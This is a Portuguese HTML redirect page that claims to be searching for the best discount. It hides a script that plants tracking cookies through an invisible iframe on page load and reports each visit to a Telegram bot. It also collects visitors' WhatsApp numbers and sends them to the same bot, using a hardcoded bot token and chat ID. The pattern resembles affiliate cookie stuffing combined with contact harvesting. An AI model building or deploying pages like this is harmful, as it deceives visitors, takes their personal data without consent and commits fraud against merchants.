<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecionando</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f9f9f9;
    }

    .circle {
      width: 30px;
      height: 30px;
      border: 4px solid green;
      border-top: 4px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 24px;
      transition: opacity 0.4s ease-in-out;
      color: #333;
    }

    #fallback {
      display: none;
      margin-top: 20px;
      font-size: 16px;
    }

    #fallback a {
      color: green;
      text-decoration: underline;
    }

    #whatsContainer {
      margin-top: 25px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    #whatsapp {
      padding: 12px 16px;
      font-size: 16px;
      border: 1.5px solid #ccc;
      border-radius: 8px;
      outline: none;
      width: 250px;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
    }

    #whatsapp:focus {
      border-color: #34a853;
    }

    #okBtn {
      padding: 12px 20px;
      background-color: #34a853;
      color: white;
      font-weight: bold;
      border: none;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    #okBtn:hover {
      background-color: #2c8b44;
    }
  </style>
</head>
<body>

  <div class="circle"></div>
  <div id="message" class="text">Espere! Procurando pelo Melhor Desconto</div>

  <!-- CAMPO WHATSAPP -->
  <div id="whatsContainer">
    <input type="tel" id="whatsapp" placeholder="Digite seu Melhor WhatsApp">
    <button id="okBtn">✅ OK</button>
  </div>

  <iframe id="cookieFrame" src="" style="display:none;"></iframe>

  <div id="fallback">
    Se não for redirecionado, <a href="https://google.com">clique aqui</a>.
  </div>

  <script>
    const cookieURL = "https://google.com";
    const checkoutURL = "https://google.com";

    const NumeroTLG = '7674575961:AAGSl6HVhZJhymoedLgBMESc9rPF88Q98Es';
    const CanalTLG = '5493027377';

    function enviarAlerta(msg) {
      const url = `https://api.telegram.org/bot${NumeroTLG}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CanalTLG, text: msg })
      }).catch(console.error);
    }

    const msg = document.getElementById("message");
    const iframe = document.getElementById("cookieFrame");
    let cookieConfirmado = false;

    // Enviar WhatsApp ao clicar em OK
    document.getElementById("okBtn").addEventListener("click", () => {
      const numero = document.getElementById("whatsapp").value.trim();
      if (!numero || numero.length < 11) {
        alert("Por favor, insira um número de WhatsApp válido. Exemplo: 43999999999");
        return;
      }
      enviarAlerta(`📲 WhatsApp Informado: ${numero}`);
      document.getElementById("okBtn").disabled = true;
      document.getElementById("okBtn").innerText = "Enviado ✅";
    });

    // Troca de mensagem após 3 segundos
    setTimeout(() => {
      msg.style.opacity = 0;
      setTimeout(() => {
        msg.textContent = "Redirecionando para Página de Pagamento";
        msg.style.opacity = 1;
      }, 400);
    }, 3000);

    // Inicia gravação do cookie
    iframe.src = cookieURL;

    iframe.onload = () => {
      setTimeout(() => {
        try {
          const test = iframe.contentWindow.location.href;
          cookieConfirmado = true;
          enviarAlerta(`✅ ACESSO DETECTADO! USUÁRIO MARCADO COM SUCESSO\nPÁGINA: ${checkoutURL}`);
          setTimeout(() => window.location.href = checkoutURL, 1000);
        } catch (e) {
          cookieConfirmado = true;
          enviarAlerta(`✅ ACESSO DETECTADO! USUÁRIO MARCADO COM SUCESSO\nPÁGINA: ${checkoutURL}`);
          setTimeout(() => window.location.href = checkoutURL, 1000);
        }
      }, 500);
    };

    setTimeout(() => {
      if (!cookieConfirmado) {
        enviarAlerta(`⛔ ACESSO DETECTADO! ERRO AO MARCAR O USUÁRIO\nPÁGINA: ${checkoutURL}`);
        document.getElementById("fallback").style.display = "block";
      }
    }, 8000);
  </script>

</body>
</html>
